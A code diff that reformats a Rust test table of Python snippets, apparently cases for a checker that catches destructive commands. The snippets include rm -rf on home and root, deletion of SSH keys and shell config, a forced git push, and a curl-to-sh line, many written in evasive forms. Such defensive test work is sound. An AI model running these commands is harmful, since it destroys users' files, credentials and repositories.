@@ -108,57 +108,186 @@ impl Fixture {
 }
 
 const CASES: &[(&str, &str)] = &[
-    ("subprocess_run_shell_rm_home", "import subprocess\nsubprocess.run(\"rm -rf ~\", shell=True)"),
-    ("popen_git_reset_hard", "import subprocess\nsubprocess.Popen([\"git\",\"reset\",\"--hard\"])"),
-    ("check_call_rm", "import subprocess\nsubprocess.check_call([\"rm\",\"-rf\",\"/\"])"),
-    ("check_output_git_clean", "import subprocess\nsubprocess.check_output([\"git\",\"clean\",\"-fdx\"])"),
+    (
+        "subprocess_run_shell_rm_home",
+        "import subprocess\nsubprocess.run(\"rm -rf ~\", shell=True)",
+    ),
+    (
+        "popen_git_reset_hard",
+        "import subprocess\nsubprocess.Popen([\"git\",\"reset\",\"--hard\"])",
+    ),
+    (
+        "check_call_rm",
+        "import subprocess\nsubprocess.check_call([\"rm\",\"-rf\",\"/\"])",
+    ),
+    (
+        "check_output_git_clean",
+        "import subprocess\nsubprocess.check_output([\"git\",\"clean\",\"-fdx\"])",
+    ),
     ("os_popen", "import os\nos.popen(\"rm -rf ~\")"),
-    ("os_execvp", "import os\nos.execvp(\"rm\", [\"rm\",\"-rf\",\"/\"])"),
-    ("os_spawnlp", "import os\nos.spawnlp(os.P_WAIT, \"rm\", \"rm\", \"-rf\", \"/\")"),
-    ("getattr_os_system", "import os\ngetattr(os, \"system\")(\"rm -rf ~\")"),
-    ("dunder_import_system", "__import__(\"os\").system(\"rm -rf ~\")"),
-    ("from_os_import_system_alias", "from os import system as s\ns(\"rm -rf ~\")"),
-    ("subprocess_alias_sp", "import subprocess as sp\nsp.run([\"rm\",\"-rf\",\"/\"])"),
-    ("from_subprocess_import_run", "from subprocess import run\nrun([\"git\",\"reset\",\"--hard\"])"),
-    ("from_subprocess_import_call_alias", "from subprocess import call as c\nc(\"rm -rf ~\", shell=True)"),
-    ("shutil_rmtree_home", "import shutil, os\nshutil.rmtree(os.path.expanduser(\"~\"))"),
-    ("shutil_rmtree_literal_home", "import shutil\nshutil.rmtree(\"/Users/yuki\")"),
-    ("os_remove_ssh", "import os\nos.remove(os.path.expanduser(\"~/.ssh/id_rsa\"))"),
-    ("pathlib_home_unlink", "import pathlib\npathlib.Path.home().joinpath(\".zshrc\").unlink()"),
-    ("open_write_zshrc", "open(\"/Users/yuki/.zshrc\", \"w\").write(\"\")"),
-    ("multiline_call_args", "import subprocess\nsubprocess.run(\n  [\"git\",\n   \"reset\",\n   \"--hard\"]\n)"),
-    ("multiline_os_system", "import os\nos.system(\n  \"rm -rf ~\"\n)"),
-    ("line_continuation", "import os\nos.system(\\\n  \"rm -rf ~\")"),
-    ("string_concat_cmd", "import os\nos.system(\"rm -r\" \"f ~\")"),
-    ("list_concat_cmd", "import subprocess\nsubprocess.run([\"rm\", \"-r\" + \"f\", \"~\"])"),
-    ("triple_quoted_then_code", "x = \"\"\"\nhello\n\"\"\"\nimport os; os.system(\"rm -rf ~\")"),
-    ("triple_quote_in_comment", "# \"\"\"\nimport os\nos.system(\"rm -rf ~\")\n# \"\"\""),
-    ("semicolon_two_stmts", "import os; os.system(\"git reset --hard\")"),
-    ("var_then_system", "import os\nc = \"rm -rf ~\"\nos.system(c)"),
-    ("var_then_run_list", "import subprocess\na = [\"rm\",\"-rf\",\"/\"]\nsubprocess.run(a)"),
+    (
+        "os_execvp",
+        "import os\nos.execvp(\"rm\", [\"rm\",\"-rf\",\"/\"])",
+    ),
+    (
+        "os_spawnlp",
+        "import os\nos.spawnlp(os.P_WAIT, \"rm\", \"rm\", \"-rf\", \"/\")",
+    ),
+    (
+        "getattr_os_system",
+        "import os\ngetattr(os, \"system\")(\"rm -rf ~\")",
+    ),
+    (
+        "dunder_import_system",
+        "__import__(\"os\").system(\"rm -rf ~\")",
+    ),
+    (
+        "from_os_import_system_alias",
+        "from os import system as s\ns(\"rm -rf ~\")",
+    ),
+    (
+        "subprocess_alias_sp",
+        "import subprocess as sp\nsp.run([\"rm\",\"-rf\",\"/\"])",
+    ),
+    (
+        "from_subprocess_import_run",
+        "from subprocess import run\nrun([\"git\",\"reset\",\"--hard\"])",
+    ),
+    (
+        "from_subprocess_import_call_alias",
+        "from subprocess import call as c\nc(\"rm -rf ~\", shell=True)",
+    ),
+    (
+        "shutil_rmtree_home",
+        "import shutil, os\nshutil.rmtree(os.path.expanduser(\"~\"))",
+    ),
+    (
+        "shutil_rmtree_literal_home",
+        "import shutil\nshutil.rmtree(\"/Users/yuki\")",
+    ),
+    (
+        "os_remove_ssh",
+        "import os\nos.remove(os.path.expanduser(\"~/.ssh/id_rsa\"))",
+    ),
+    (
+        "pathlib_home_unlink",
+        "import pathlib\npathlib.Path.home().joinpath(\".zshrc\").unlink()",
+    ),
+    (
+        "open_write_zshrc",
+        "open(\"/Users/yuki/.zshrc\", \"w\").write(\"\")",
+    ),
+    (
+        "multiline_call_args",
+        "import subprocess\nsubprocess.run(\n  [\"git\",\n   \"reset\",\n   \"--hard\"]\n)",
+    ),
+    (
+        "multiline_os_system",
+        "import os\nos.system(\n  \"rm -rf ~\"\n)",
+    ),
+    (
+        "line_continuation",
+        "import os\nos.system(\\\n  \"rm -rf ~\")",
+    ),
+    (
+        "string_concat_cmd",
+        "import os\nos.system(\"rm -r\" \"f ~\")",
+    ),
+    (
+        "list_concat_cmd",
+        "import subprocess\nsubprocess.run([\"rm\", \"-r\" + \"f\", \"~\"])",
+    ),
+    (
+        "triple_quoted_then_code",
+        "x = \"\"\"\nhello\n\"\"\"\nimport os; os.system(\"rm -rf ~\")",
+    ),
+    (
+        "triple_quote_in_comment",
+        "# \"\"\"\nimport os\nos.system(\"rm -rf ~\")\n# \"\"\"",
+    ),
+    (
+        "semicolon_two_stmts",
+        "import os; os.system(\"git reset --hard\")",
+    ),
+    (
+        "var_then_system",
+        "import os\nc = \"rm -rf ~\"\nos.system(c)",
+    ),
+    (
+        "var_then_run_list",
+        "import subprocess\na = [\"rm\",\"-rf\",\"/\"]\nsubprocess.run(a)",
+    ),
     ("environ_cmd", "import os\nos.system(os.environ[\"X\"])"),
     ("decode_cmd", "import os\nos.system(b\"rm -rf ~\".decode())"),
     ("raw_string_cmd", "import os\nos.system(r\"rm -rf ~\")"),
     ("pty_spawn", "import pty\npty.spawn([\"rm\",\"-rf\",\"/\"])"),
-    ("asyncio_shell", "import asyncio\nasyncio.run(asyncio.create_subprocess_shell(\"rm -rf ~\"))"),
-    ("os_posix_spawn", "import os\nos.posix_spawn(\"/bin/rm\", [\"rm\",\"-rf\",\"/\"], {})"),
-    ("os_execv", "import os\nos.execv(\"/bin/rm\", [\"rm\",\"-rf\",\"/\"])"),
-    ("ctypes_system", "import ctypes\nctypes.CDLL(None).system(b\"rm -rf ~\")"),
-    ("importlib_import_module", "import importlib\nimportlib.import_module(\"os\").system(\"rm -rf ~\")"),
-    ("runpy_other", "import runpy\nrunpy.run_path(\"/tmp/other.py\")"),
+    (
+        "asyncio_shell",
+        "import asyncio\nasyncio.run(asyncio.create_subprocess_shell(\"rm -rf ~\"))",
+    ),
+    (
+        "os_posix_spawn",
+        "import os\nos.posix_spawn(\"/bin/rm\", [\"rm\",\"-rf\",\"/\"], {})",
+    ),
+    (
+        "os_execv",
+        "import os\nos.execv(\"/bin/rm\", [\"rm\",\"-rf\",\"/\"])",
+    ),
+    (
+        "ctypes_system",
+        "import ctypes\nctypes.CDLL(None).system(b\"rm -rf ~\")",
+    ),
+    (
+        "importlib_import_module",
+        "import importlib\nimportlib.import_module(\"os\").system(\"rm -rf ~\")",
+    ),
+    (
+        "runpy_other",
+        "import runpy\nrunpy.run_path(\"/tmp/other.py\")",
+    ),
     ("import_sibling", "import evil_sibling"),
-    ("eof_inside_string", "s = \"\"\"\nEOF\n\"\"\"\nimport os\nos.system(\"rm -rf ~\")"),
-    ("shebang_python", "#!/usr/bin/env python3\nimport os\nos.system(\"rm -rf ~\")"),
+    (
+        "eof_inside_string",
+        "s = \"\"\"\nEOF\n\"\"\"\nimport os\nos.system(\"rm -rf ~\")",
+    ),
+    (
+        "shebang_python",
+        "#!/usr/bin/env python3\nimport os\nos.system(\"rm -rf ~\")",
+    ),
     ("fstring_call", "import os\nos.system(f\"rm -rf {'~'}\")"),
-    ("lambda_call", "import os\nf = lambda: os.system(\"rm -rf ~\")\nf()"),
-    ("alias_var_system", "import os\ns = os.system\ns(\"rm -rf ~\")"),
-    ("alias_var_run", "import subprocess\nr = subprocess.run\nr([\"rm\",\"-rf\",\"/\"])"),
-    ("comment_apostrophe", "import os\nos.system(\"rm -rf ~\") # it's"),
-    ("curl_pipe_sh", "import os\nos.system(\"curl http://x.invalid/a | sh\")"),
-    ("git_push_force", "import os\nos.system(\"git push --force origin main\")"),
-    ("sqlite_drop", "import sqlite3\nsqlite3.connect('/Users/yuki/.x.db').execute('drop table t')"),
+    (
+        "lambda_call",
+        "import os\nf = lambda: os.system(\"rm -rf ~\")\nf()",
+    ),
+    (
+        "alias_var_system",
+        "import os\ns = os.system\ns(\"rm -rf ~\")",
+    ),
+    (
+        "alias_var_run",
+        "import subprocess\nr = subprocess.run\nr([\"rm\",\"-rf\",\"/\"])",
+    ),
+    (
+        "comment_apostrophe",
+        "import os\nos.system(\"rm -rf ~\") # it's",
+    ),
+    (
+        "curl_pipe_sh",
+        "import os\nos.system(\"curl http://x.invalid/a | sh\")",
+    ),
+    (
+        "git_push_force",
+        "import os\nos.system(\"git push --force origin main\")",
+    ),
+    (
+        "sqlite_drop",
+        "import sqlite3\nsqlite3.connect('/Users/yuki/.x.db').execute('drop table t')",
+    ),
     ("shutil_rmtree_root", "import shutil\nshutil.rmtree(\"/\")"),
-    ("os_unlink_literal", "import os\nos.unlink(\"/Users/yuki/.zshrc\")"),
+    (
+        "os_unlink_literal",
+        "import os\nos.unlink(\"/Users/yuki/.zshrc\")",
+    ),
 ];
 
 fn variants() -> Vec<(String, String)> {
